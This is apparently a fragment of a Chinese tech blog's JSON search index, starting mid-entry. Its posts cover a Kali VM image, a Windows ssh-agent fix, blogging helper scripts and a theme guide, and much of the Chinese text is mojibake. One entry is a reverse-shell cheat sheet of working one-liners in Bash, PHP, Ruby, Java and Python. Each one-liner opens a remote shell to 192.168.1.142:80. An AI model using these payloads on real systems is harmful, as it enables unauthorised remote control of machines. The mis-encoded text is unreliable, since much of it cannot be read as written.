10.Xï¼‰è™šæ‹Ÿæœºå³å¯ï¼Œé»˜è®¤è´¦æˆ·å¯†ç ä¸º root:toor\nè½¯ä»¶æºå·²æ”¹ä¸ºå›½å†…çš„ä¸­ç§‘å¤§æºï¼Œä¸éœ€è¦è‡ªå·±æ¢\nç³»ç»Ÿæ›´æ–° å·²æ›´æ–°åˆ° 2018-09-04 æœ€æ–°ï¼Œå¦‚æœéœ€è¦æ›´æ–°å¯ä»¥è¿è¡Œå‘½ä»¤\n1 2 apt upadte apt full-upgrade é¡¶æ é€æ˜ å›¾ç‰‡ä¸Šçš„é¡¶æ å¯ä»¥æ”¹ä¸ºé€æ˜çš„ï¼Œåœ¨é¡¶æ ä¸Šå³é”®ç„¶åæ‰¾åˆ° é¢æ¿é¦–é€‰é¡¹ -\u0026gt; å¤–è§‚ -\u0026gt; alpha æ”¹ä¸º 0 ï¼Œé¡¶æ å¯é€æ˜\næ›´æ–°vmtool æ‰“å¼€ç»ˆç«¯\n1 2 apt update apt install open-vm-tools-desktop å¦‚æœæœ‰æ–°ç‰ˆæœ¬vmtoolä¼šæç¤ºæ›´æ–°\nä¸‹è½½ æ ¡éªŒ 1 2 3 4 5 å¤§å°: 3649679846 å­—èŠ‚ ä¿®æ”¹æ—¶é—´: 2018å¹´9æœˆ4æ—¥, 11:18:46 MD5: EDC1BF26205D06EA668F8EA03A05D456 SHA1: 4C2F32BA2DDC53425F34B4316F55C66755A08ACA CRC32: A51255F0 åœ°å€ ç™¾åº¦ç½‘ç›˜ | å¯†ç : jcus ","permalink":"https://www.hacktech.cn/post/kali-xfce-vm-amd64-beautify.html","summary":"\u003ch2 id=\"èµ·å› \"\u003eèµ·å› \u003c/h2\u003e\n\u003cp\u003eè¿™ä¸¤å¤©æ¥å­¦æ ¡æŠŠç¡¬ç›˜åŸºæœ¬å…¨éƒ¨æ¸…ç©ºäº†ï¼Œæ‰€ä»¥ä»¥å‰çš„è™šæ‹Ÿæœºå°±éœ€è¦é‡æ–°å®‰è£…äº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eKali\u003c/code\u003e ä¸€ç›´ç”¨çš„æ˜¯ \u003ccode\u003exfce\u003c/code\u003e ç‰ˆæœ¬ï¼Œè‡³äºä¸ºä»€ä¹ˆç”¨è¿™ä¸ªç‰ˆæœ¬ï¼Œæ˜¯å› ä¸ºæˆ‘æ„Ÿè§‰ \u003ccode\u003egnome3\u003c/code\u003e åœ¨è™šæ‹Ÿæœºä¸Šè¡¨ç°æ¬ ä½³ã€‚å½“ç„¶ï¼Œé»˜è®¤çš„ \u003ccode\u003egnome3\u003c/code\u003e çœ‹èµ·æ¥è¿˜æ˜¯ä¸é”™çš„ï¼Œè€Œ \u003ccode\u003exfce\u003c/code\u003e é»˜è®¤çš„å°±çœ‹èµ·æ¥å¾ˆå¯’ç¢œäº†\u003c/p\u003e\n\u003cp\u003eé»˜è®¤çš„ \u003ccode\u003eKali-Xfce\u003c/code\u003e æ˜¯è¿™ä¸ªæ ·å­çš„\u003c/p\u003e","title":"Kali Linux Xfceç‰ˆç¾åŒ–è™šæ‹Ÿæœºé•œåƒ"},{"content":"PowerShellå®‰è£…äº†pshazzæˆ–è€…posh-gitï¼Œä½†æ˜¯æ‰“å¼€çš„æ—¶å€™æç¤º unable to start ssh-agent service, error :1058\n1803çš„è®¾ç½®ä¸Šé¢å¯ä»¥çœ‹åˆ°è¿™ä¸ªç‰ˆæœ¬æ˜¯é»˜è®¤å¸¦äº†opensshå®¢æˆ·ç«¯çš„ï¼Œæˆ‘ä»¬ä¸éœ€è¦å¦å¤–å»å®‰è£…ï¼Œä½†æ˜¯å‘½ä»¤è¡Œè¿è¡Œ ssh-agent ä¾ç„¶æ˜¯æ˜¾ç¤º unable to start ssh-agent service, error :1058\næ—¢ç„¶æœ‰è¿™ä¸ªä¸œè¥¿ï¼Œä½†æ˜¯æœåŠ¡å¯åŠ¨å¤±è´¥ï¼Œé‚£æˆ‘ä»¬çœ‹çœ‹æœ¬åœ°æœåŠ¡ï¼Œæœç„¶ï¼Œåœ¨æœ¬åœ°æœåŠ¡ä¸­ç¦ç”¨äº†ï¼Œæˆ‘ä»¬æ”¹æˆæ‰‹åŠ¨æˆ–è€…è‡ªåŠ¨å°±èƒ½è§£å†³è¿™ä¸ªé—®é¢˜äº†\n","permalink":"https://www.hacktech.cn/post/win10-1803-unable-to-start-ssh-agent.html","summary":"\u003cp\u003ePowerShellå®‰è£…äº†pshazzæˆ–è€…posh-gitï¼Œä½†æ˜¯æ‰“å¼€çš„æ—¶å€™æç¤º \u003ccode\u003eunable to start ssh-agent service, error :1058\u003c/code\u003e\u003c/p\u003e","title":"win10 1803ç‰ˆæœ¬unable to start ssh-agent service, error :1058"},{"content":"Bash 1 bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.142/80 0\u0026gt;\u0026amp;1 1 2 3 4 exec 5\u0026lt;\u0026gt;/dev/tcp/192.168.1.142/80 cat \u0026lt;\u0026amp;5 | while read line; do $line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; done # or: while read line 0\u0026lt;\u0026amp;5; do $line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; done PHP 1 2 php -r â€˜$sock=fsockopen(â€œ192.168.1.142â€,80);exec(â€œ/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3â€);â€™ (Assumes TCP uses file descriptor 3. If it doesnâ€™t work, try 4,5, or 6) RUBY 1 ruby -rsocket -eâ€™f=TCPSocket.open(â€œ192.168.1.142â€,80).to_i;exec sprintf(â€œ/bin/sh -i \u0026lt;\u0026amp;%d \u0026gt;\u0026amp;%d 2\u0026gt;\u0026amp;%dâ€,f,f,f)â€™ JAVA 1 2 3 r = Runtime.getRuntime() p = r.exec([â€œ/bin/bashâ€,â€-câ€,â€exec 5\u0026lt;\u0026gt;/dev/tcp/192.168.1.142/80;cat \u0026lt;\u0026amp;5 | while read line; do \\$line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; doneâ€] as String[]) p.waitFor() PYTHON 1 python -c â€˜import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ192.168.1.142â€,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([â€œ/bin/shâ€,â€-iâ€]);â€™ ","permalink":"https://www.hacktech.cn/post/the-code-reverse-shell-and-port-forward.html","summary":"\u003ch2 id=\"bash\"\u003eBash\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.142/80 0\u0026gt;\u0026amp;\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e4\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexec 5\u0026lt;\u0026gt;/dev/tcp/192.168.1.142/80\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat \u0026lt;\u0026amp;\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e | \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e read line; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e $line 2\u0026gt;\u0026amp;\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e \u0026gt;\u0026amp;5; \u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# or:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e read line 0\u0026lt;\u0026amp;5; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e $line 2\u0026gt;\u0026amp;\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e \u0026gt;\u0026amp;5; \u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e","title":"åå¼¹shellä»¥åŠç«¯å£è½¬å‘çš„æ–¹æ³•æ”¶é›†"},{"content":"ç”¨æ³•ï¼š\n1 2 python the.py file_name [article_title] [author_id] # []æ‹¬èµ·æ¥ä¸ºå¯é€‰é¡¹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #!/usr/bin/env python import sys import time def main(): file_name = \u0026#39;\u0026#39; post_title = \u0026#39;\u0026#39; author = \u0026#39;me\u0026#39; if len(sys.argv) == 2: file_name = str(sys.argv[1]) post_title = str(sys.argv[1]) elif len(sys.argv) == 3: file_name = str(sys.argv[1]) post_title = str(sys.argv[2]) elif len(sys.argv) == 4: file_name = str(sys.argv[1]) post_title = str(sys.argv[2]) author = str(sys.argv[3]) else: print(\u0026#34;Usage: \\n\\t%s file_name [article_title] [author_id]\u0026#34; % sys.argv[0]) return with open(\u0026#39;./blog/source/%s.md\u0026#39; % file_name, \u0026#39;w\u0026#39;) as f: f.write(\u0026#39;title: %s\\n\u0026#39; % post_title) f.write(\u0026#39;date: %s\\n\u0026#39; % time.strftime(\u0026#34;%Y-%m-%d %H:%M:%S\u0026#34;, time.localtime())) f.write(\u0026#39;update: \u0026#34;\u0026#34;\\n\u0026#39;) f.write(\u0026#39;author: %s\\n\u0026#39; % author) f.write(\u0026#39;tags: \\n\u0026#39;) f.write(\u0026#39;- \\n\u0026#39;) f.write(\u0026#39;categories: \\n\u0026#39;) f.write(\u0026#39;- \\n\u0026#39;) f.write(\u0026#39;topic: \u0026#34;\u0026#34;\\n\u0026#39;) f.write(\u0026#39;cover: \u0026#34;\u0026#34;\\n\u0026#39;) f.write(\u0026#39;draft: false\\n\u0026#39;) f.write(\u0026#39;preview: \u0026#34;\u0026#34;\\n\u0026#39;) f.write(\u0026#39;top: false\\n\u0026#39;) f.write(\u0026#39;type: \u0026#34;\u0026#34;\\n\u0026#39;) f.write(\u0026#39;hide: false\\n\u0026#39;) f.write(\u0026#39;config: null\\n\u0026#39;) f.write(\u0026#39;\\n\\n---\\n\\n\\n\\n\u0026#39;) print(\u0026#39;Create %s.md Finished\u0026#39; % file_name) if __name__ == \u0026#39;__main__\u0026#39;: main() ","permalink":"https://www.hacktech.cn/post/ink-create-md.html","summary":"\u003cp\u003eç”¨æ³•ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epython the.py file_name \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003earticle_title\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eauthor_id\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# []æ‹¬èµ·æ¥ä¸ºå¯é€‰é¡¹\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e","title":"ä¸ºçº¸å°å¢¨ä¸€é”®åˆ›å»ºmdæ–‡ä»¶"},{"content":"æœ‰æ—¶å€™æ„Ÿè§‰é¡¹ç›®pushä¸Šå»æ¯æ¬¡éƒ½æ•²é‚£ä¹ˆå‡ ä¸ªå‘½ä»¤æŒºçƒ¦äººçš„ï¼Œå¯ä»¥ç”¨è¿™ä¸ªè„šæœ¬æ¥ä»£æ›¿æ‰‹å·¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 #!/usr/bin/env python import os import subprocess import sys import time gitconfig = { \u0026#39;cwd\u0026#39;: \u0026#39;./blog/public\u0026#39;, \u0026#39;git\u0026#39;: { \u0026#39;github\u0026#39;: [\u0026#39;git@github.com:akkuman/akkuman.github.io.git\u0026#39;, \u0026#39;master\u0026#39;], \u0026#39;coding\u0026#39;: [\u0026#39;git@git.coding.net:Akkuman/Akkuman.git\u0026#39;, \u0026#39;coding-pages\u0026#39;], } } def main(): global gitconfig # change working directory os.chdir(gitconfig.get(\u0026#39;cwd\u0026#39;, \u0026#39;.\u0026#39;)) # check if git init if \u0026#39;.git\u0026#39; not in os.listdir(): subprocess.check_call([\u0026#39;git\u0026#39;, \u0026#39;init\u0026#39;]) # check if remote in config, if not, add the remote git_remotes = subprocess.check_output([\u0026#39;git\u0026#39;, \u0026#39;remote\u0026#39;, \u0026#39;-v\u0026#39;]) git_remotes_str = bytes.decode(git_remotes).strip() git_remotes_list = [line.split()[0] for line in git_remotes_str.split(\u0026#39;\\n\u0026#39;)] for k,v in gitconfig[\u0026#39;git\u0026#39;].items(): if k not in git_remotes_list: subprocess.check_call([\u0026#39;git\u0026#39;, \u0026#39;remote\u0026#39;, \u0026#39;add\u0026#39;, k, v[0]]) # add . \u0026amp; commit with message subprocess.check_call([\u0026#39;git\u0026#39;, \u0026#39;add\u0026#39;, \u0026#39;.\u0026#39;]) commit_message = \u0026#39;Site updated: %s\u0026#39; % time.strftime(\u0026#34;%Y-%m-%d %H:%M:%S\u0026#34;, time.localtime()) if len(sys.argv) == 2: commit_message = sys.argv[1] subprocess.call([\u0026#39;git\u0026#39;, \u0026#39;commit\u0026#39;, \u0026#39;-m\u0026#39;, commit_message]) # push to every remote repo for k,v in gitconfig[\u0026#39;git\u0026#39;].items(): subprocess.check_call([\u0026#39;git\u0026#39;, \u0026#39;push\u0026#39;, k, \u0026#39;master:%s\u0026#39; % v[1]]) if __name__ == \u0026#39;__main__\u0026#39;: if len(sys.argv) == 2: if sys.argv[1] == \u0026#39;-h\u0026#39;: print(\u0026#39;Usage:\\n\\t%s [commit_message]\u0026#39; % sys.argv[0]) main() ","permalink":"https://www.hacktech.cn/post/git-push-python-script.html","summary":"\u003cp\u003eæœ‰æ—¶å€™æ„Ÿè§‰é¡¹ç›®pushä¸Šå»æ¯æ¬¡éƒ½æ•²é‚£ä¹ˆå‡ ä¸ªå‘½ä»¤æŒºçƒ¦äººçš„ï¼Œå¯ä»¥ç”¨è¿™ä¸ªè„šæœ¬æ¥ä»£æ›¿æ‰‹å·¥\u003c/p\u003e","title":"ä¸€é”®git pushè„šæœ¬(pythonç‰ˆ)"},{"content":"ä¸»é¢˜ä»‹ç» ä¸ºçº¸å°å¢¨å†™çš„ä¸€æ¬¾ä¸»é¢˜,è¯¥ä¸»é¢˜ç§»æ¤è‡ªYumoe\ngithubåœ°å€ï¼šink-theme-story\nDemo ink-theme-story\nä¸»é¢˜çš„ä¸€äº›é£Ÿç”¨è¯´æ˜ èœå• æ ‡é¢˜æ—è¾¹æœ‰ä¸€ä¸ª Â· å­—ç¬¦ï¼Œç‚¹å‡»åä¾¿å¯æ˜¾ç¤ºèœå•ã€‚1,2,3 åˆ†åˆ«ä»£è¡¨ ç‹¬ç«‹é¡µé¢èœå•ã€å¯¼èˆªæ ‘(ä»…åœ¨æ–‡ç« ç•Œé¢æœ‰ç”¨)ä»¥åŠæœç´¢æ¡†ã€‚\nä¸€äº›åŠŸèƒ½ è¯„è®ºç‚¹å‡»åŠ è½½, å¯ä»¥åº”å¯¹ä¸€äº›å¢™å¯¼è‡´æ— æ³•åŠ è½½çš„åœºæ™¯ å›¾ç‰‡æ‡’åŠ è½½ è¯„è®ºç³»ç»Ÿæ”¯æŒæ¥å¿…åŠ›, Disqus, Gitment, é»˜è®¤ä¸ºDisqus \u0026hellip; ä¸»é¢˜æˆªå›¾ ä½¿ç”¨æ–¹æ³• åŸºç¡€è®¾ç½® è¿›å…¥åˆ°çº¸å°å¢¨ç¨‹åºçš„ç›®å½•ä¸‹, ä¹Ÿå°±æ˜¯inkä¸»ç¨‹åºçš„ç›®å½•, ç„¶åè¿›å…¥è¯¥ç›®å½•ä¸‹çš„blogç›®å½•\nç„¶åæ‰§è¡Œ\n1 git clone https://github.com/akkuman/ink-theme-story.git æˆ–è€…ä¸‹è½½gitå‹ç¼©åŒ…åè§£å‹åˆ°blogæ–‡ä»¶å¤¹\nç°åœ¨ä½ å¯ä»¥çœ‹åˆ°blogç›®å½•ä¸‹çš„ink-theme-storyç›®å½•\nç„¶åä¿®æ”¹ç«™ç‚¹é…ç½®æ–‡ä»¶blog/config.yml\nç«™ç‚¹é…ç½®æ–‡ä»¶ä¸€èˆ¬å¦‚ä¸‹:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 site: title: \u0026#34;Akkuman\u0026#34; subtitle: \u0026#34;Akkumançš„æŠ€æœ¯åšå®¢\u0026#34; limit: 8 theme: ink-theme-story lang: zh url: \u0026#34;ink-theme-story.pancakeapps.com\u0026#34; comment: Akkuman logo: \u0026#34;-/images/avatar.png\u0026#34; # link: \u0026#34;{category}/{year}/{month}/{day}/{title}.html\u0026#34; link: \u0026#34;{year}/{month}/{day}/{title}.html\u0026#34; # root: \u0026#34;/blog\u0026#34; authors: me: name: \u0026#34;Akkuman\u0026#34; intro: \u0026#34;ç¼–ç¨‹å°ç™½|æŠ€æœ¯èœé¸Ÿ\u0026#34; avatar: \u0026#34;-/images/avatar.png\u0026#34; build: # output: \u0026#34;public\u0026#34; port: 8000 # Copied files to public folder when build copy: - \u0026#34;source/images\u0026#34; # Excuted command when use \u0026#39;ink publish\u0026#39; publish: | git add . -A git commit -m \u0026#34;update\u0026#34; git push origin æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„åœ°æ–¹æœ‰:\n1 2 3 4 title #titleå­—æ®µæ˜¯æˆªå›¾ä¸­çš„å·¦ä¸Šè§’Akkumanå­—æ®µ, æ¯”å¦‚æˆ‘è®¾ç½®ä¸ºAkkumané‚£ä¹ˆå°±æ˜¯å’Œæˆ‘æˆªå›¾ä¸­ä¸€æ · subtitle #ç½‘ç«™å­æ ‡é¢˜, åœ¨æ ‡ç­¾é¡µå’Œå½’æ¡£èƒ½çœ‹åˆ° limit: 8 #æ¯é¡µå¯æ˜¾ç¤ºçš„æ–‡ç« æ•°ç›®, ä¸ºäº†ç¾è§‚å»ºè®®è®¾ç½®ä¸º8 theme: ink-theme-story #ç½‘ç«™ä¸»é¢˜ç›®å½•, è®¾ç½®ä¸ºè¯¥ä¸»é¢˜ink-theme-story å…¶ä»–åœ°æ–¹æ ¹æ®è‡ªå·±éœ€æ±‚æ›´æ”¹, çº¸å°å¢¨è¯´æ˜æ–‡æ¡£è§ç®€æ´çš„é™æ€åšå®¢æ„å»ºå·¥å…· â€”â€” çº¸å°å¢¨ï¼ˆInkPaperï¼‰\nå…³äºé¡µé¢ åœ¨çº¸å°å¢¨ä¸­,æ¯ç¯‡æ–‡ç« æ˜¯æœ‰ä½œè€…çš„,æˆ‘ç°åœ¨æŒ‰ä¸Šé¢æˆ‘ç»™å‡ºçš„ä¾‹å­é…ç½®ä¸ºä¾‹è¿›è¡Œè¯´æ˜\nçº¸å°å¢¨ä¸­æ¯ä¸€ç¯‡æ–‡ç« çš„å¤´é…ç½®å¤§è‡´å¦‚ä¸‹:\n1 2 3 4 5 6 7 8 9 title: \u0026#34;ç®€æ´çš„é™æ€åšå®¢æ„å»ºå·¥å…· â€”â€” çº¸å°å¢¨ï¼ˆInkPaperï¼‰\u0026#34; date: 2015-03-01 18:00:00 +0800 update: 2016-07-11 17:00:00 +0800 author: me cover: \u0026#34;-/images/example.png\u0026#34; tags: - è®¾è®¡ - å†™ä½œ preview: çº¸å°å¢¨ï¼ˆInkPaperï¼‰æ˜¯ä¸€ä¸ªGOè¯­è¨€ç¼–å†™çš„å¼€æºé™æ€åšå®¢æ„å»ºå·¥å…·ï¼Œå¯ä»¥å¿«é€Ÿæ­å»ºåšå®¢ç½‘ç«™ã€‚å®ƒæ— ä¾èµ–è·¨å¹³å°ï¼Œé…ç½®ç®€å•æ„å»ºå¿«é€Ÿï¼Œæ³¨é‡ç®€æ´æ˜“ç”¨ä¸æ›´ä¼˜é›…çš„æ’ç‰ˆã€‚ å…¶ä¸­çš„previewæ˜¯æ–‡ç« é¢„è§ˆï¼Œä¹Ÿå¯åœ¨æ­£æ–‡ä¸­ä½¿ç”¨\u0026lt;!--more--\u0026gt;åˆ†å‰², æ˜¯ä¸€ä¸ªå¯é€‰å­—æ®µ,æˆ‘ä»¬ä¸å¿…ç®¡\nå¯¹æˆ‘ä»¬æœ‰å½±å“çš„å­—æ®µé…ç½®é™¤äº†åŸºç¡€çš„titleç­‰ç­‰ä¹‹å¤–, éœ€è¦å…³æ³¨ä¸€ä¸‹authorè¿™ä¸ªå­—æ®µ\nçº¸å°å¢¨æ¯ä¸€ç¯‡æ–‡ç« çš„ä½œè€…çš„å…³äºé¡µé¢æ˜¯\n1 about.{{.Author.Id}}.html æ¯”å¦‚æˆ‘ä¸Šé¢çš„ç«™ç‚¹é…ç½®æ–‡ä»¶ä¸­authorsæœ‰ä¸€ä¸ªå€¼æ˜¯me, é‚£ä¹ˆè¿™ä¸ªä½œè€…çš„å…³äºé¡µé¢å°±æ˜¯about.me.html, ä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦å»ºç«‹ä¸€ä¸ªpage, çº¸å°å¢¨ä¸»ç¨‹åºæ‰“åŒ…ä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶about.me.md, å¯ä»¥å‚è§è¿™ä¸ªæ–‡ä»¶çš„æ ¼å¼, æˆ‘åœ¨è¿™é‡Œç»™å‡ºæ¥:\n1 2 3 4 5 6 7 8 9 10 11 type: page title: \u0026#34;å…³äºä½œè€…\u0026#34; author: me --- ## çº¸å°å¢¨ æ„å»ºåªä¸ºçº¯ç²¹ä¹¦å†™çš„åšå®¢ã€‚ [http://www.chole.io/](http://www.chole.io/) é‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶ç”Ÿæˆåå°±ä¼šåœ¨ç«™ç‚¹æ ¹ç›®å½•ä¸‹ç”Ÿæˆabout.me.htmlæ–‡ä»¶.\né‡ç‚¹æ¥äº†\nä¸Šé¢æˆ‘è¯´çš„å…³äºé¡µé¢æ˜¯å•ä¸ªä½œè€…çš„å…³äºé¡µé¢, åœ¨è¿™ä¸ªä¸»é¢˜ä¸­, æˆ‘æœ‰å®šä¹‰ä¸€ä¸ªç«™ç‚¹çš„å…³äºé¡µé¢\n1 \u0026lt;a href=\u0026#34;{{.Site.Root}}/about.html\u0026#34;\u0026gt;\u0026lt;li\u0026gt;{{i18n \u0026#34;about\u0026#34;}}\u0026lt;/li\u0026gt;\u0026lt;/a\u0026gt; æˆ‘ä»¬åªéœ€è¦æŒ‰ç…§ä¸Šé¢about.me.mdçš„æ ¼å¼æ–°å»ºä¸€ä¸ªabout.mdå³å¯, æˆ‘åœ¨è¿™é‡Œç»™å‡ºä¸€ä¸ªabout.mdä¾‹å­:\n1 2 3 4 5 6 type: page title: \u0026#34;å…³äºæœ¬ç«™\u0026#34; --- æˆ‘æ˜¯ä¸€ä¸ªç«™ç‚¹å…³äºé¡µé¢ä¾‹å­ authorå­—æ®µå¯çœç•¥,çœ‹è‡ªå·±çš„å–œå¥½\nè¯„è®ºç³»ç»Ÿåˆ‡æ¢ æœ¬ä¸»é¢˜çš„è¯„è®ºé‡‡ç”¨ç‚¹å‡»å†åŠ¨æ€åŠ è½½çš„æ–¹å¼, æ‰€ä»¥ä¸ç”¨æ‹…å¿ƒå› ä¸ºDisqusè¢«å¢™çš„åŸå› å¯¼è‡´é¡µé¢æ‰“ä¸å¼€, åªæœ‰å½“ä½ ç‚¹å‡»show commentsæ—¶æ‰ä¼šå¼€å§‹åŠ è½½è¯„è®º\næœ¬ä¸»é¢˜çš„è¯„è®ºç³»ç»Ÿæ”¯æŒæ¥å¿…åŠ›, Disqus, Gitment\næ¥å¿…åŠ›Livere åˆ‡æ¢ä¸ºæ¥å¿…åŠ›çš„è¯åªéœ€è¦ä¿®æ”¹ç«™ç‚¹é…ç½®æ–‡ä»¶blog/config.yml, æŠŠcommentå­—æ®µçš„å€¼ä¿®æ”¹æˆæ¥å¿…åŠ›çš„data-uid(å¯åœ¨æ¥å¿…åŠ›åå°ä»£ç ç®¡ç†ä¸­çœ‹åˆ°), ç„¶åæ‰“å¼€blog/ink-theme-story/_comment.htmlæ–‡ä»¶, æŠŠæ¥å¿…åŠ›è¯„è®ºçš„æ³¨é‡Šå»æ‰, ç„¶åæŠŠDisqusè¯„è®ºåŠ ä¸Šæ³¨é‡Šå³å¯\nGitment åˆ‡æ¢ä¸ºGitmentçš„è¯åŒä¸Šä¿®æ”¹, commentå­—æ®µçš„æ ¼å¼ä¸º\n1 comment: \u0026#34;owner:repo:client_id:client_secret\u0026#34; å…¶ä¸­å„ä¸ªçš„å±æ€§ä¸º\n1 2 3 4 owner #ä½ çš„ GitHub ID repo #å­˜å‚¨è¯„è®ºçš„ repo client_id #ä½ çš„ client ID client_secret #ä½ çš„ client secret ç„¶åæ‰“å¼€blog/ink-theme-story/_comment.htmlæ–‡ä»¶, æŠŠGitmentè¯„è®ºçš„æ³¨é‡Šå»æ‰, ç„¶åæŠŠDisqusè¯„è®ºåŠ 